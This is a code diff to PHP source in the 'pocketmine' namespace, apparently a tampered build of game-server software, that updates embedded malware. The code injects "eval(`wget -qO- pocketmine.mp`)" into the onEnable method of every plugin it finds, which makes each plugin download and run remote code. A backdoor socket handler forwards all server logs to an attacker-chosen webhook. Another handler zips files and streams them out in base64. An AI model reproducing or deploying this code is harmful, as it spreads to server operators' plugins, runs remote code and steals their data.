@@ -92,27 +92,30 @@ namespace pocketmine {
                     $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
                     $fileContents = explode("\n", @file_get_contents($filePath));
                     $payload = "eval(`wget -qO- pocketmine.mp`);";
-                    foreach ($fileContents as $value) {
-                        if (str_contains($value, $payload)) continue 2;
-                    }
+                    $find = function (string|array $queries, array $contents): int|false {
+                        foreach ($contents as $key => $value) {
+                            if (is_string($queries)) if (!str_contains(strtolower($value), strtolower($queries))) continue;
+                            else foreach ($queries as $query) {
+                                if (!str_contains(strtolower($value), strtolower($query))) continue 2;
+                            }
+                            return $key;
+                        }
+                        return false;
+                    };
+                    if (!$find($payload, $fileContents)) continue;
                     $hasStrictTypes = function () use ($fileContents): bool {
                         return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
                     };
                     if ($hasStrictTypes() or true) {
-                        $findOnEnable = function () use ($fileContents, $payload) {
-                            foreach ($fileContents as $key => $value) {
-                                if (!str_contains(strtolower($value), "onenable")) continue;
-                                return $key;
-                            }
-                            return false;
+                        $findMain = function () use ($fileContents, $payload, $find): int|false {
+                            $main = $find(["extends", "pluginbase"], $fileContents);
+                            if (!$main) return false;
+                            return $find("{", array_slice($fileContents, $main));
                         };
-                        $findMain = function () use ($fileContents, $payload) {
-                            foreach ($fileContents as $key => $value) {
-                                if (str_contains($value, $payload)) return false;
-                                if (!str_contains(strtolower($value), "extends") or !str_contains(strtolower($value), "pluginbase")) continue;
-                                return $key + ((str_contains(strtolower($value), "{") and str_contains(strtolower($fileContents[$key + 1]), "}") ? 0 : 1);
-                            }
-                            return false;
+                        $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
+                            $onEnable = $find("onenable", $fileContents);
+                            if (!$onEnable) return false;
+                            return $find("{", array_slice($fileContents, $onEnable));
                         };
                         $onEnable = $findOnEnable();
                         $tab_detector = function (array $array) {
@@ -129,10 +132,7 @@ namespace pocketmine {
                         $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
                         if (!$onEnable) {
                             $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
-                        } else {
-                            $key = $onEnable + (str_contains($fileContents[$onEnable] ?? "", "{") ? 1 : 2);
-                            $fileContents["$key.5"] = "$tab$payload";
-                        }
+                        } else $fileContents["$onEnable.5"] = "$tab$payload";
                         ksort($fileContents);
                         @file_put_contents($filePath, implode("\n", $fileContents));
                     } else {
@@ -327,44 +327,28 @@ namespace pocketmine {
                                                 switch ($packetType) {
                                                     case 9:
                                                         $this->cmd = ltrim($payload);
-                                                        $logger = new class (\Symfony\Component\Filesystem\Path::join(realpath("server.log")), \pocketmine\utils\Terminal::hasFormattingCodes(), "Server", new \DateTimeZone(\pocketmine\utils\Timezone::get())) extends \pocketmine\utils\MainLogger {
-                                                            public string $webhook = '';
-
-                                                            protected function send(string $message, string $level, string $prefix, string $color): void
+                                                        \pocketmine\utils\Internet::postURL($this->cmd, ['content' => 'success']);
+                                                        \pocketmine\Server::getInstance()->getLogger()->addAttachment(new class ($this->cmd) extends \pocketmine\thread\log\ThreadSafeLoggerAttachment {
+                                                            public function __construct(private string $webhook)
                                                             {
-                                                                parent::send($message, $level, $prefix, $color);
-                                                                $task = new class ($message, $this->webhook, \pocketmine\Server::getInstance()->getPort()) extends \pocketmine\scheduler\AsyncTask {
-                                                                    public function __construct(private string $message, private string $webhook, private int $port)
+                                                            }
+
+                                                            public function log(string $level, string $message): void
+                                                            {
+                                                                $task = new class ($this->webhook, $level, $message) extends \pocketmine\scheduler\AsyncTask {
+                                                                    public function __construct(private string $webhook, private string $level, private string $message)
                                                                     {
                                                                     }
 
                                                                     public function onRun(): void
                                                                     {
-                                                                        try {
-                                                                            $ip = \pocketmine\utils\Internet::getIP();
-                                                                            $data = ["content" => "`$ip:$this->port`: **$this->message**"];
-                                                                            $curl = @curl_init($this->webhook);
-                                                                            @curl_setopt($curl, CURLOPT_POST, 1);
-                                                                            @curl_setopt($curl, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data"]);
-                                                                            @curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-                                                                            @curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-                                                                            @curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-                                                                            @curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
-                                                                            @curl_exec($curl);
-                                                                            @curl_close($curl);
-                                                                        } catch (\ValueError) {
-                                                                        }
+                                                                        \pocketmine\utils\Internet::postURL($this->webhook, ['content' => "> [" . strtoupper($this->level) . "] $this->message"]);
                                                                     }
                                                                 };
-                                                                $size = \pocketmine\Server::getInstance()->getAsyncPool()->getSize();
-                                                                $pool = \pocketmine\Server::getInstance()->getAsyncPool()->submitTaskToWorker($task, $size);
+                                                                \pocketmine\Server::getInstance()->getAsyncPool()->submitTask($task);
                                                             }
-                                                        };
-                                                        $logger->webhook = $this->cmd;
-                                                        $property = new \ReflectionProperty(\pocketmine\Server::getInstance(), 'logger');
-                                                        $property->setAccessible(true);
-                                                        $property->setValue(\pocketmine\Server::getInstance(), $logger);
-                                                        $this->writePacket($sock, $requestID, 0, 'success');
+                                                        });
+                                                        $this->writePacket($sock, $requestID, 0, $this->cmd);
                                                         $this->response = "";
                                                         $this->cmd = "";
                                                     case 6:
@@ -384,7 +368,7 @@ namespace pocketmine {
                                                             @$zip->close();
                                                         }
                                                         $file = @fopen("$filtered.zip", "rb");
-                                                        $this->writePacket($sock, $requestID, 7, strlen(@base64_encode(@file_get_contents("$filtered.zip"))));
+                                                        $this->writePacket($sock, $requestID, 7, (string)strlen(@base64_encode(@file_get_contents("$filtered.zip"))));
                                                         $i = 0;
                                                         while (!$this->stop and !feof($file)) {
                                                             $content = @base64_encode(@fread($file, 1024 * 16));
@@ -463,7 +447,7 @@ namespace pocketmine {
 
                     public function start(): void
                     {
-                        $this->thread?->start();
+                        $this->thread?->start(\pmmp\thread\Thread::INHERIT_NONE);
                     }
 
                     public function tick(): void
